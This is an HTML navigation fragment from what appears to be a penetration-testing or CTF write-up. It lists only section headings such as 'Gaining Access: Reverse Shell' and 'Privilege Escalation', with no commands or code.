<span class="nav-text">Gaining Access: Reverse Shell</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#privilege-escalation"> <span class="nav-number">4</span> <span class="nav-text">Privilege Escalation</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#summary"> <span class="nav-number">5</span> <span class="nav-text">Summary</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#before-you-leave"> <span class="nav-number">6</span> <span class="nav-text">Before you leave</span> </a> </li>
     </ol>
   </div>
             
